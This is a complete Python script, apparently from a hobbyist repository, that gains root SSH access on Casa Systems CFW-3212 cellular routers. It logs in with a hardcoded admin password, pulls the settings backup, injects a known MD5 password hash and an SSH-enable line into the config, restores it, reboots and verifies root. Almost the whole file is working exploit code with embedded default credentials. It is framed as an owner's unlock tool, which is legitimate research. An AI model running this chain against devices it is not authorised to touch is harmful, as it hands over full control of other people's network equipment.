#!/usr/bin/env python3
# Copyright (C) 2026 Luke Jenkins
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
"""CFW-3212 Unlock: Config Restore Hash Injection

https://github.com/lukejenkins/cellular

Achieves root SSH access on Casa Systems CFW-3212 using only Ethernet.
Injects a known MD5 crypt hash into telnet.passwd.encrypted via the
settings backup/restore mechanism.

All units I've tested have been those customized for U.S. Cellular.
Tested on firmware versions: USC_1.1.79.0, 1.2.24.0

System requirements: openssl, expect, curl
Python requirements: none (stdlib only)
"""

SCRIPT_VERSION = "1.0.0"

import argparse
import base64
import gzip
import http.client
import io
import json
import logging
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime

# Force HTTP/1.0 — some CFW-3212 lighttpd builds stall on HTTP/1.1
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = "HTTP/1.0"

TARGET = "192.168.1.1"
WEB_USER = "admin"
WEB_PASS = "roofclimberabove"
SSH_PASS = "chpaccess"
SSH_HASH_SALT = "test"

log = logging.getLogger("cfw3212_unlock")


class UnlockError(Exception):
    pass


def log_version_info():
    log.info(f"unlock_cfw3212 v{SCRIPT_VERSION}")
    log.info(f"Python {sys.version}")
    log.info(f"Platform: {platform.platform()}")
    log.debug(f"Python executable: {sys.executable}")
    log.debug(f"Python prefix: {sys.prefix}")

    for mod_name in ["http.client", "urllib.request", "urllib.parse",
                     "urllib.error", "gzip", "tarfile", "json", "socket",
                     "subprocess", "logging", "io", "base64", "re"]:
        mod = sys.modules.get(mod_name)
        if mod:
            path = getattr(mod, "__file__", "(built-in)")
            version = getattr(mod, "__version__", None)
            ver_str = f" v{version}" if version else ""
            log.debug(f"  {mod_name}{ver_str}: {path}")

    for tool in ["curl", "openssl", "expect", "ssh"]:
        path = shutil.which(tool)
        if path:
            try:
                ver = subprocess.run([tool, "--version"], capture_output=True,
                                     text=True, timeout=5)
                first_line = (ver.stdout or ver.stderr).split("\n")[0].strip()
                log.debug(f"  {tool}: {path} ({first_line})")
            except Exception:
                log.debug(f"  {tool}: {path}")
        else:
            log.warning(f"  {tool}: NOT FOUND")

    log.debug(f"HTTP mode: {http.client.HTTPConnection._http_vsn_str}")


def setup_logging(debug=False):
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    logfile = f"unlock_cfw3212-{timestamp}.log"

    file_handler = logging.FileHandler(logfile)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(logging.Formatter(
        "%(asctime)s %(levelname)-5s %(message)s", datefmt="%H:%M:%S"
    ))

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG if debug else logging.INFO)
    if debug:
        console_handler.setFormatter(logging.Formatter(
            "%(asctime)s %(levelname)-5s %(message)s", datefmt="%H:%M:%S"
        ))
    else:
        console_handler.setFormatter(logging.Formatter("%(message)s"))

    log.setLevel(logging.DEBUG)
    log.addHandler(file_handler)
    log.addHandler(console_handler)

    log.info(f"Logging to {logfile}")
    return logfile


def curl_request(url, method="GET", headers=None, data=None,
                 output_file=None, timeout=30):
    """HTTP request via curl subprocess. Fallback for when urllib fails."""
    cmd = ["curl", "-s", "-S", "--max-time", str(timeout),
           "-D", "-",  # dump headers to stdout
           "-X", method]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if data is not None:
        if isinstance(data, bytes):
            cmd += ["--data-binary", "@-"]
        else:
            cmd += ["-d", data]
    if output_file:
        cmd += ["-o", output_file]
    cmd.append(url)

    log.debug(f"curl: {method} {url}")
    result = subprocess.run(
        cmd,
        input=data if isinstance(data, bytes) else None,
        capture_output=True,
        timeout=timeout + 10,
    )
    if result.returncode != 0:
        stderr = result.stderr.decode(errors="replace").strip()
        raise UnlockError(f"curl failed ({result.returncode}): {stderr}")

    raw = result.stdout
    if output_file:
        # headers only in stdout when using -o
        return raw.decode(errors="replace"), b""

    # Split headers from body (curl -D - puts headers then blank line then body)
    parts = raw.split(b"\r\n\r\n", 1)
    header_text = parts[0].decode(errors="replace")
    body = parts[1] if len(parts) > 1 else b""
    log.debug(f"  -> {header_text.split(chr(10))[0].strip()} ({len(body)} bytes)")
    return header_text, body


class CFW3212Unlock:
    def __init__(self, target, use_curl=False):
        self.target = target
        self.base = f"http://{target}"
        self.cookies = {}
        self.csrf = None
        self.use_curl = use_curl

    def _cookie_header(self):
        if not self.cookies:
            return ""
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def _parse_set_cookies(self, header_text):
        for line in header_text.split("\n"):
            line = line.strip()
            if line.lower().startswith("set-cookie:"):
                val = line.split(":", 1)[1].strip()
                parts = val.split(";")[0].split("=", 1)
                if len(parts) == 2:
                    self.cookies[parts[0].strip()] = parts[1].strip()

    def _request(self, path, data=None, method=None, raw_response=False):
        url = f"{self.base}/{path.lstrip('/')}"
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data)

        if self.use_curl:
            return self._request_curl(url, data, method, raw_response)
        return self._request_urllib(url, data, method, raw_response)

    def _request_curl(self, url, data=None, method=None, raw_response=False):
        if method is None:
            method = "POST" if data is not None else "GET"
        headers = {}
        if self.cookies:
            headers["Cookie"] = self._cookie_header()
        if data is not None and "Content-Type" not in headers:
            headers["Content-Type"] = "application/x-www-form-urlencoded"

        send_data = data.encode() if isinstance(data, str) else data
        header_text, body = curl_request(url, method=method, headers=headers,
                                         data=send_data)
        self._parse_set_cookies(header_text)
        if raw_response:
            return body
        return body.decode()

    def _request_urllib(self, url, data=None, method=None, raw_response=False):
        if isinstance(data, str):
            data = data.encode()

        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "curl/8.0")
        req.add_header("Connection", "close")
        if self.cookies:
            req.add_header("Cookie", self._cookie_header())
        if isinstance(data, bytes) and not req.has_header("Content-type"):
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

        log.debug(f"urllib: {req.get_method()} {url}")
        log.debug(f"  Headers: {dict(req.headers)}")
        last_err = None
        for attempt in range(3):
            try:
                resp = urllib.request.urlopen(req, timeout=30)
                break
            except Exception as e:
                last_err = e
                log.debug(f"  Attempt {attempt+1}/3 failed: {type(e).__name__}: {e}")
                if attempt < 2:
                    time.sleep(3)
        else:
            raise last_err

        for header in resp.headers.get_all("Set-Cookie") or []:
            parts = header.split(";")[0].split("=", 1)
            if len(parts) == 2:
                self.cookies[parts[0].strip()] = parts[1].strip()

        body = resp.read()
        log.debug(f"  -> {resp.status} ({len(body)} bytes)")
        if raw_response:
            return body
        return body.decode()

    def _get_csrf(self, page="index.html"):
        html = self._request(page)
        m = re.search(r"csrfToken\s*=\s*'([^']+)'", html)
        if not m:
            raise UnlockError(f"Could not extract CSRF token from {page}")
        self.csrf = m.group(1)
        log.debug(f"  CSRF: {self.csrf[:20]}...")
        return self.csrf

    def _multipart_upload(self, url, fields, file_field, file_data, filename):
        boundary = "----CFW3212UnlockBoundary"
        body = b""
        for key, val in fields.items():
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{key}\"\r\n\r\n{val}\r\n".encode()
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
        body += file_data
        body += f"\r\n--{boundary}--\r\n".encode()

        if self.use_curl:
            headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }
            if self.cookies:
                headers["Cookie"] = self._cookie_header()
            full_url = f"{self.base}/{url.lstrip('/')}"
            header_text, resp_body = curl_request(
                full_url, method="POST", headers=headers, data=body)
            self._parse_set_cookies(header_text)
            result = resp_body.decode()
        else:
            req = urllib.request.Request(f"{self.base}/{url.lstrip('/')}", data=body)
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
            req.add_header("Connection", "close")
            req.add_header("User-Agent", "curl/8.0")
            if self.cookies:
                req.add_header("Cookie", self._cookie_header())
            log.debug(f"urllib: POST {url} (multipart, {len(body)} bytes)")
            resp = urllib.request.urlopen(req, timeout=30)
            for header in resp.headers.get_all("Set-Cookie") or []:
                parts = header.split(";")[0].split("=", 1)
                if len(parts) == 2:
                    self.cookies[parts[0].strip()] = parts[1].strip()
            result = resp.read().decode()
        log.debug(f"  -> upload result: {result}")
        return result

    def _detect_upload_endpoint(self):
        html = self._request("settings_backup.html")
        self.csrf = re.search(r"csrfToken\s*=\s*'([^']+)'", html).group(1)
        js_match = re.search(r'src="(/js/NTC_UI\.js[^"]*)"', html)
        if js_match:
            try:
                js = self._request(js_match.group(1))
                if "/fileupload" in js:
                    return "/fileupload/settings_backup"
            except Exception:
                pass
        return None

    def _login(self):
        self._get_csrf("index.html")
        b64pass = base64.b64encode(WEB_PASS.encode()).decode()
        payload = json.dumps({
            "username": WEB_USER,
            "password": b64pass,
            "csrfToken": self.csrf,
        })

        if self.use_curl:
            headers = {
                "Content-Type": "application/json",
            }
            if self.cookies:
                headers["Cookie"] = self._cookie_header()
            header_text, body = curl_request(
                f"{self.base}/login", method="POST",
                headers=headers, data=payload.encode())
            self._parse_set_cookies(header_text)
            result = json.loads(body.decode())
        else:
            req = urllib.request.Request(
                f"{self.base}/login",
                data=payload.encode(),
                headers={"Content-Type": "application/json",
                         "User-Agent": "curl/8.0",
                         "Connection": "close"},
            )
            if self.cookies:
                req.add_header("Cookie", self._cookie_header())
            log.debug(f"urllib: POST /login")
            resp = urllib.request.urlopen(req, timeout=30)
            for header in resp.headers.get_all("Set-Cookie") or []:
                parts = header.split(";")[0].split("=", 1)
                if len(parts) == 2:
                    self.cookies[parts[0].strip()] = parts[1].strip()
            result = json.loads(resp.read().decode())

        log.debug(f"  Login result: {result}")
        if result.get("result") != 0:
            raise UnlockError(f"Login failed: {result}")
        log.debug(f"  Cookies: {list(self.cookies.keys())}")

    def _enable_ssh(self):
        self._get_csrf("access_control.html")
        data = json.dumps({
            "setObject": [{"name": "localAccessControl", "localHttpEnable": "1",
                          "localHttpsEnable": "0", "localSshEnable": "1"}],
            "csrfToken": self.csrf,
        })
        body = self._request("cgi-bin/jsonSrvr.lua",
                             data=f"data={urllib.parse.quote(data)}")
        result = json.loads(body)
        log.debug(f"  SSH enable response: {result}")
        if result.get("result") != 0:
            raise UnlockError(f"SSH enable failed: {result}")
        return result.get("localAccessControl", {}).get("localSshEnable", "?")

    def step1_login(self):
        log.info("[1/8] Logging in...")
        self._login()
        log.info("       Login OK")

    def step2_enable_ssh(self):
        log.info("[2/8] Enabling SSH...")
        ssh_state = self._enable_ssh()
        log.info(f"       SSH enable = {ssh_state}")

    def step3_download_backup(self):
        log.info("[3/8] Downloading settings backup...")
        self._get_csrf("settings_backup.html")
        b64pass = base64.b64encode(b"chptest").decode()
        body = self._request("BackupSettings", data={
            "password": b64pass,
            "csrfToken": self.csrf,
            "restoreFactory": "0",
        })
        result = json.loads(body)
        log.debug(f"  Backup response: {result}")
        if result.get("result") != 0:
            raise UnlockError(f"Backup request failed: {result}")
        filename = result["data"]["filename"]
        log.debug(f"  Downloading: {filename}")
        backup_data = self._request(filename, raw_response=True)
        log.info(f"       Downloaded {len(backup_data)} bytes ({filename})")
        return backup_data

    def step4_inject_hash(self, backup_data):
        log.info("[4/8] Injecting password hash into cfg...")
        hash_output = subprocess.run(
            ["openssl", "passwd", "-1", "-salt", SSH_HASH_SALT, SSH_PASS],
            capture_output=True, text=True, check=True,
        )
        new_hash = hash_output.stdout.strip()
        encoded_hash = urllib.parse.quote(new_hash)
        log.info(f"       Hash: {new_hash}")
        log.debug(f"  URL-encoded: {encoded_hash}")

        raw = gzip.decompress(backup_data)
        tar_in = tarfile.open(fileobj=io.BytesIO(raw))
        members = tar_in.getmembers()
        log.debug(f"  Backup contents: {[m.name for m in members]}")

        cfg_member = None
        for m in members:
            if m.name.endswith(".cfg"):
                cfg_member = m
                break
        if not cfg_member:
            raise UnlockError("No .cfg file found in backup")

        cfg_data = tar_in.extractfile(cfg_member).read().decode()
        lines = cfg_data.split("\n")
        log.debug(f"  CFG: {cfg_member.name} ({len(lines)} lines)")

        for i, line in enumerate(lines):
            if "telnet.passwd" in line:
                log.debug(f"  Line {i+1}: {line}")

        # Inject password hash
        injected = False
        for i, line in enumerate(lines):
            if line.startswith("telnet.passwd.encrypted;"):
                old_val = line.split(";", 1)[1] if ";" in line else "(none)"
                log.debug(f"  Replacing line {i+1}: old value = {old_val[:40]}...")
                lines[i] = f"telnet.passwd.encrypted;{encoded_hash}"
                injected = True
                break
        if not injected:
            log.debug("  telnet.passwd.encrypted not found, appending")
            lines.append(f"telnet.passwd.encrypted;{encoded_hash}")

        # Inject SSH enable — config restore overwrites the API-set value,
        # so we must set it in the cfg itself
        ssh_injected = False
        for i, line in enumerate(lines):
            if line.startswith("admin.local.ssh_enable;"):
                old_val = line.split(";", 1)[1]
                log.debug(f"  Setting admin.local.ssh_enable: {old_val} -> 1")
                lines[i] = "admin.local.ssh_enable;1"
                ssh_injected = True
                break
        if not ssh_injected:
            log.debug("  admin.local.ssh_enable not found, appending")
            lines.append("admin.local.ssh_enable;1")

        new_cfg = "\n".join(lines)
        log.info(f"       Injected into {cfg_member.name}")

        out_buf = io.BytesIO()
        tar_out = tarfile.open(fileobj=out_buf, mode="w")
        for m in members:
            if m.name == cfg_member.name:
                data = new_cfg.encode()
                info = tarfile.TarInfo(name=m.name)
                info.size = len(data)
                info.mtime = m.mtime
                info.mode = m.mode
                tar_out.addfile(info, io.BytesIO(data))
            else:
                tar_out.addfile(m, tar_in.extractfile(m))
        tar_out.close()
        tar_in.close()

        restore_data = gzip.compress(out_buf.getvalue())
        log.info(f"       Repackaged: {len(restore_data)} bytes")
        return restore_data

    def _try_upload(self, upload_url, restore_data):
        self._get_csrf("settings_backup.html")
        result_text = self._multipart_upload(
            upload_url,
            fields={
                "csrfTokenPost": self.csrf,
                "name": "/usrdata/cache/settingsBackup.zip",
                "target": "configFileUploader",
                "commit": "0",
            },
            file_field="file",
            file_data=restore_data,
            filename="settingsBackup.zip",
        )
        result = json.loads(result_text)
        if result.get("result") != "0":
            raise UnlockError(f"Upload failed: {result_text}")

    def step5_upload(self, restore_data):
        log.info("[5/8] Uploading modified backup...")
        detected = self._detect_upload_endpoint()
        if detected:
            log.info(f"       Endpoint (detected): {detected}")
            self._try_upload(detected, restore_data)
        else:
            for url in ["/fileupload/settings_backup", "/upload/settings_backup"]:
                try:
                    log.info(f"       Trying: {url}")
                    self._try_upload(url, restore_data)
                    break
                except (urllib.error.HTTPError, UnlockError) as e:
                    log.debug(f"  {url} failed: {e}")
                    continue
            else:
                raise UnlockError("Upload failed on both /fileupload/ and /upload/ endpoints")
        log.info("       Upload OK")

    def step6_restore(self):
        log.info("[6/8] Restoring settings...")
        self._get_csrf("settings_backup.html")
        b64pass = base64.b64encode(b"chptest").decode()
        body = self._request("RestoreSettings", data={
            "password": b64pass,
            "csrfToken": self.csrf,
            "restoreFactory": "0",
        })
        result = json.loads(body)
        log.debug(f"  Restore response: {result}")
        if result.get("result") != 0:
            raise UnlockError(f"Restore failed: {result}")
        log.info("       Restore OK")

    def step7_reboot(self):
        log.info("[7/8] Rebooting device...")
        self._get_csrf("settings_backup.html")
        data = json.dumps({
            "setObject": [{"name": "TrigReboot"}],
            "csrfToken": self.csrf,
        })
        body = self._request("cgi-bin/jsonSrvr.lua",
                             data=f"data={urllib.parse.quote(data)}")
        result = json.loads(body)
        log.debug(f"  Reboot response: {result}")
        if result.get("result") != 0:
            raise UnlockError(f"Reboot failed: {result}")
        boot_dur = result.get("TrigReboot", {}).get("lastBootDuration", "?")
        log.info(f"       Reboot triggered (last boot: {boot_dur}s)")

        # Phase 1: wait for web UI
        log.info("       Waiting for web UI...")
        time.sleep(10)
        for i in range(30):
            time.sleep(5)
            try:
                urllib.request.urlopen(f"http://{self.target}/index.html", timeout=3)
                elapsed = 10 + (i + 1) * 5
                log.info(f"       Web UI online after ~{elapsed}s")
                break
            except Exception:
                pass
        else:
            raise UnlockError("Device did not come back after reboot")

        # Phase 2: re-enable SSH via web UI API.
        # The cfg injection should persist admin.local.ssh_enable;1, but
        # as a fallback, also set it via the API after reboot.
        log.info("       Re-enabling SSH via web UI API (post-reboot)...")
        try:
            self.cookies = {}
            self._login()
            log.info("       Login OK")
            ssh_state = self._enable_ssh()
            log.info(f"       SSH enable = {ssh_state}")
        except Exception as e:
            log.warning(f"       Post-reboot SSH enable failed: {e}")
            log.warning("       Continuing — cfg injection may have persisted it")

        # Phase 3: wait for sshd to stabilize.
        # sshd can start briefly then restart during boot. Wait for it to
        # stay open across two checks 30s apart.
        log.info("       Waiting for SSH to stabilize...")
        first_seen = None
        ever_seen = False
        consecutive = 0
        needed = 3
        for i in range(24):
            time.sleep(10)

            # Check ping first
            ping_ok = False
            try:
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "3", self.target],
                    capture_output=True, text=True, timeout=5,
                )
                ping_ok = result.returncode == 0
            except Exception:
                pass
            if not ping_ok:
                log.info(f"       check {i+1}: ping failed — device rebooting, this is expected")
                first_seen = None
                consecutive = 0
                continue

            # Check web UI
            web_ok = False
            try:
                urllib.request.urlopen(
                    f"http://{self.target}/index.html", timeout=5)
                web_ok = True
            except Exception:
                pass
            if not web_ok:
                log.info(f"       check {i+1}: ping OK, web UI not ready, this is expected")
                first_seen = None
                consecutive = 0
                continue

            # Check SSH banner
            try:
                s = socket.create_connection((self.target, 22), timeout=5)
                banner = s.recv(256)
                s.close()
                log.info(f"       check {i+1}: ping OK, web OK, SSH banner: {banner.decode(errors='replace').strip()}")
                consecutive += 1
                if not ever_seen:
                    ever_seen = True
                    first_seen = i
                    log.info(f"       SSH check successful, waiting for {needed} consecutive checks before moving on")
                elif consecutive >= needed:
                    log.info(f"       SSH stable after ~{(i + 1) * 10}s ({consecutive}/{needed} consecutive)")
                    break
                else:
                    log.info(f"       ({consecutive}/{needed} consecutive), this is expected")
            except socket.timeout:
                log.info(f"       check {i+1}: ping OK, web OK, SSH port timeout, this is expected")
                first_seen = None
                consecutive = 0
            except ConnectionRefusedError:
                log.info(f"       check {i+1}: ping OK, web OK, SSH port refused, this is expected")
                first_seen = None
                consecutive = 0
            except Exception as e:
                log.info(f"       check {i+1}: ping OK, web OK, SSH error: {e}")
                first_seen = None
                consecutive = 0
        else:
            raise UnlockError("SSH did not stabilize after reboot")

    def _diagnose_connectivity(self):
        """Check ping, web, and SSH banner. Called after SSH login failure."""
        # Ping
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "3", self.target],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                # Extract RTT from ping output
                rtt = ""
                for line in result.stdout.split("\n"):
                    if "time=" in line:
                        rtt = " (" + line.split("time=")[1].strip().rstrip(")") + ")"
                        break
                log.info(f"       diag: ping OK{rtt}")
            else:
                log.info("       diag: ping FAILED — host unreachable")
                return  # no point checking further
        except Exception as e:
            log.info(f"       diag: ping ERROR — {e}")
            return

        # Web UI
        try:
            resp = urllib.request.urlopen(
                f"http://{self.target}/index.html", timeout=5)
            log.info(f"       diag: web UI OK (HTTP {resp.status})")
        except Exception as e:
            log.info(f"       diag: web UI FAILED — {e}")

        # SSH banner
        try:
            s = socket.create_connection((self.target, 22), timeout=5)
            banner = s.recv(256)
            s.close()
            log.info(f"       diag: SSH banner OK — {banner.decode(errors='replace').strip()}")
        except socket.timeout:
            log.info("       diag: SSH port TIMEOUT — port filtered or sshd not responding")
        except ConnectionRefusedError:
            log.info("       diag: SSH port REFUSED — sshd not running")
        except Exception as e:
            log.info(f"       diag: SSH port ERROR — {e}")

    def _try_ssh(self):
        """Single SSH attempt. Returns (success, output)."""
        result = subprocess.run(
            ["expect", "-c", f'''
set timeout 30
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o NumberOfPasswordPrompts=1 root@{self.target}
expect {{
    -nocase "password:" {{ send "{SSH_PASS}\\r"; exp_continue }}
    "Permission denied" {{ exit 1 }}
    "# " {{ send "id; hostname; rdb_get telnet.passwd.encrypted; exit\\r"; exp_continue }}
    timeout {{ puts "EXPECT_TIMEOUT"; exit 2 }}
    eof {{}}
}}
'''],
            capture_output=True, text=True, timeout=45,
        )
        log.debug(f"  SSH stdout: {result.stdout.strip()}")
        log.debug(f"  SSH stderr: {result.stderr.strip()}")
        log.debug(f"  SSH exit code: {result.returncode}")
        return "uid=0(root)" in result.stdout, result.stdout

    def step8_verify_ssh(self):
        log.info("[8/8] Verifying SSH access...")
        for attempt in range(8):
            log.info(f"       SSH attempt {attempt + 1}/8...")
            success, output = self._try_ssh()
            if success:
                log.info("       *** ROOT ACCESS CONFIRMED ***")
                for line in output.split("\n"):
                    line = line.strip()
                    if line.startswith("uid=") or line.startswith("usc") or line.startswith("$1$"):
                        log.info(f"       {line}")
                return True
            if "Permission denied" in output:
                log.info("       Password rejected")
            elif "Connection refused" in output or "Connection reset" in output:
                log.info("       SSH not ready")
            elif "EXPECT_TIMEOUT" in output:
                log.info("       SSH prompt timeout")
            else:
                log.info("       No response from SSH")
            self._diagnose_connectivity()
            log.info("       Retrying in 20s...")
            time.sleep(20)
        raise UnlockError(f"SSH verification failed after 8 attempts. Last output:\n{output}")

    def run(self):
        log.info(f"=== CFW-3212 Vector 1 Unlock: {self.target} ===\n")
        self.step1_login()
        self.step2_enable_ssh()
        backup = self.step3_download_backup()
        restore = self.step4_inject_hash(backup)
        self.step5_upload(restore)
        self.step6_restore()
        self.step7_reboot()
        self.step8_verify_ssh()
        log.info("")
        log.info("=== UNLOCK COMPLETE ===")
        log.info(f"  IP:       {self.target}")
        log.info(f"  User:     root")
        log.info(f"  Password: {SSH_PASS}")
        log.info(f"  ssh root@{self.target}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CFW-3212 Vector 1 Unlock")
    parser.add_argument("--target", default=TARGET,
                        help=f"Device IP (default: {TARGET})")
    parser.add_argument("--debug", action="store_true",
                        help="Show debug output on console")
    parser.add_argument("--curl", action="store_true",
                        help="Use curl subprocess instead of urllib")
    args = parser.parse_args()

    logfile = setup_logging(debug=args.debug)
    log_version_info()

    unlock = CFW3212Unlock(args.target, use_curl=args.curl)
    try:
        unlock.run()
    except UnlockError as e:
        log.error(f"\n*** FAILED: {e} ***")
        sys.exit(1)
    except Exception as e:
        log.error(f"\n*** UNEXPECTED ERROR: {type(e).__name__}: {e} ***")
        log.debug("Traceback:", exc_info=True)
        sys.exit(1)
    except KeyboardInterrupt:
        log.info("\nAborted.")
        sys.exit(1)
